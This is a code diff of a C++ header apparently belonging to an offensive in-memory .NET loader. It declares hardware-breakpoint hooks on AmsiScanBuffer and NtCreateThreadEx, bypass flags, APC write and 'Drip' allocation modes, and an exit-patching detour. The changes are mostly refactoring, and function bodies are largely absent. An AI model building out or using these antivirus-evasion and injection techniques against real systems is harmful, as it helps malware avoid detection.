@@ -1,3 +1,6 @@
+#ifndef GENERAL_HPP
+#define GENERAL_HPP
+
 #include <Externs.hpp>
 #include <Common.hpp>
 #include <Strings.hpp>
@@ -15,15 +18,21 @@ typedef mscorlib::_Type         IType;
 typedef mscorlib::_MethodInfo   IMethodInfo;
 typedef mscorlib::BindingFlags  IBindingFlags;
 
-enum Write {
-    Default,
-    Apc
-};
+#define min(a, b) (((a) < (b)) ? (a) : (b))
 
-enum Alloc {
-    Default,
-    Drip
-};
+namespace Write {
+    enum Type {
+        Default,
+        Apc
+    };
+}
+
+namespace Alloc {
+    enum Type {
+        Default,
+        Drip
+    };
+}
 
 #define HW_ALL_THREADS 0x25
 
@@ -67,6 +76,10 @@ namespace Hwbp {
         UPTR Handle;
         UPTR AmsiScanBuffer;
     } Amsi;
+
+    UPTR ExitPtr;
+
+    auto PatchExitDetour( PCONTEXT Ctx ) -> VOID;
 
     auto SetDr7(
         _In_ UPTR ActVal,
@@ -140,9 +153,7 @@ namespace Hwbp {
 
     auto RmNewThreads(
         _In_ INT8 Drx
-    ) -> BOOL {
-        return Hwbp::Uninstall( U_PTR( GetProcAddress( GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx" ) ), HW_ALL_THREADS );
-    }
+    ) -> BOOL;
 
     auto NtCreateThreadExHk(
         _In_ PCONTEXT Ctx
@@ -152,7 +163,7 @@ namespace Hwbp {
 struct {
     GUID CLRMetaHost;
     GUID CorRuntimeHost;
-} CLSID = {
+} xCLSID = {
     .CLRMetaHost    = { 0x9280188d, 0xe8e,  0x4867, { 0xb3, 0xc,  0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde } },
     .CorRuntimeHost = { 0xcb2f6723, 0xab3a, 0x11d2, { 0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e } }
 };
@@ -165,7 +176,7 @@ struct {
     GUID ICLRRuntimeInfo;
     GUID ICorRuntimeHost;
     GUID IDispatch;
-} IID = {
+} xIID = {
     .MscorlibAsm      = { 0x17156360, 0x2F1A, 0x384A, { 0xBC, 0x52, 0xFD, 0xE9, 0x3C, 0x21, 0x5C, 0x5B } },
     .IHostControl     = { 0x02CA073C, 0x7079, 0x4860, { 0x88, 0x0A, 0xC2, 0xF7, 0xA4, 0x49, 0xC9, 0x91 } },
     .AppDomain        = { 0x05F696DC, 0x2B29, 0x3663, { 0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13 } },
@@ -183,6 +194,7 @@ struct {
 namespace Dotnet {
     BOOL  ExitBypass = FALSE;
     ULONG Bypass     = KH_BYPASS_NONE;
+    UPTR  ExitPtr    = 0;
 
     auto VersionList( VOID ) -> VOID;
 
@@ -225,7 +237,7 @@ namespace Dotnet {
 
     auto PatchExit(
         _In_ ICorRuntimeHost* IRuntime
-    ) -> HRESULT;
+    ) -> PVOID;
 }
 
 namespace Fix {
@@ -329,3 +341,20 @@ namespace IAT {
         { reinterpret_cast<PVOID>( &__wgetmainargs ), "__wgetmainargs" }
     };
 }
+
+auto GetErrorMsg( INT32 ErrorCode ) -> CHAR* {
+    LPSTR errorMessage = nullptr;
+    DWORD flags = 
+        FORMAT_MESSAGE_ALLOCATE_BUFFER | 
+        FORMAT_MESSAGE_FROM_SYSTEM | 
+        FORMAT_MESSAGE_IGNORE_INSERTS;
+
+    DWORD result = FormatMessageA(
+        flags, nullptr, ErrorCode, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
+        (LPSTR)&errorMessage, 0, nullptr
+    );
+
+    return errorMessage;
+}
+
+#endif // GENERAL_HPP
